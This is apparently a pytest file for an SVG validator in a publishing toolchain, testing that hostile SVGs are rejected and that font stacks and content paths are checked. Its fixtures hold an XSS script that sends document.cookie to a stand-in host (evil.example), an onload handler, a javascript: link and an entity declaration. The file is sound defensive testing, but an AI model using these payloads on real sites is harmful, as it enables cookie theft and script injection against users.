from pathlib import Path

import cli.arch2 as arch2_cli


def test_svg_validation_rejects_entity_declarations(tmp_path: Path) -> None:
    path = tmp_path / "hostile.svg"
    path.write_text(
        """<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY payload "expanded text">]>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <text x="10" y="20">&payload;</text>
</svg>
""",
        encoding="utf-8",
    )

    findings = arch2_cli.svg_text_findings_for_file(path)

    assert len(findings) == 1
    assert findings[0].code == "svg-parse"
    assert "EntitiesForbidden" in findings[0].message


def test_svg_validation_rejects_script_element(tmp_path: Path) -> None:
    path = tmp_path / "script.svg"
    path.write_text(
        """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script type="text/javascript"><![CDATA[
    fetch('https://evil.example/steal?c=' + document.cookie);
  ]]></script>
  <rect width="100" height="100"/>
</svg>
""",
        encoding="utf-8",
    )

    findings = arch2_cli.svg_text_findings_for_file(path)

    assert any(f.code == "svg-script" for f in findings)
    assert any("<script>" in f.message for f in findings)


def test_svg_validation_rejects_event_handler_attribute(tmp_path: Path) -> None:
    path = tmp_path / "handler.svg"
    path.write_text(
        """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" onload="alert(document.domain)"/>
</svg>
""",
        encoding="utf-8",
    )

    findings = arch2_cli.svg_text_findings_for_file(path)

    assert any(f.code == "svg-script" for f in findings)
    assert any("onload" in f.message for f in findings)


def test_svg_validation_rejects_javascript_uri(tmp_path: Path) -> None:
    path = tmp_path / "uri.svg"
    path.write_text(
        """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100">
  <a xlink:href="  JavaScript:alert(1)"><rect width="100" height="100"/></a>
</svg>
""",
        encoding="utf-8",
    )

    findings = arch2_cli.svg_text_findings_for_file(path)

    assert any(f.code == "svg-script" for f in findings)
    assert any("href" in f.message for f in findings)


def test_svg_validation_accepts_benign_svg(tmp_path: Path) -> None:
    path = tmp_path / "benign.svg"
    path.write_text(
        """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <a href="https://example.com/docs"><rect width="100" height="100"/></a>
</svg>
""",
        encoding="utf-8",
    )

    findings = arch2_cli.svg_text_findings_for_file(path)

    assert not any(f.code == "svg-script" for f in findings)


def test_svg_font_validation_requires_shared_stack(tmp_path: Path) -> None:
    canonical = tmp_path / "canonical.svg"
    canonical.write_text(
        "<svg><style>.font { font-family: Arial, Helvetica, sans-serif; }</style></svg>",
        encoding="utf-8",
    )
    outlier = tmp_path / "outlier.svg"
    outlier.write_text(
        "<svg><style>.font { font-family: Georgia, serif; }</style></svg>",
        encoding="utf-8",
    )

    assert arch2_cli.svg_font_family_findings(canonical) == []
    findings = arch2_cli.svg_font_family_findings(outlier)

    assert len(findings) == 1
    assert findings[0].code == "svg-font-family"
    assert "Georgia, serif" in findings[0].message


def test_svg_paths_default_to_recursive_content_roots(
    tmp_path: Path, monkeypatch
) -> None:
    chapters = tmp_path / "chapters"
    backmatter = tmp_path / "backmatter"
    chapter_svg = chapters / "chapter-1" / "images" / "chapter.svg"
    appendix_svg = backmatter / "appendix-a" / "images" / "appendix.svg"
    chapter_svg.parent.mkdir(parents=True)
    appendix_svg.parent.mkdir(parents=True)
    chapter_svg.write_text("<svg/>", encoding="utf-8")
    appendix_svg.write_text("<svg/>", encoding="utf-8")

    monkeypatch.setattr(arch2_cli, "CONTENT_ROOTS", (chapters, backmatter))

    assert arch2_cli.svg_paths() == sorted(
        [chapter_svg.resolve(), appendix_svg.resolve()]
    )
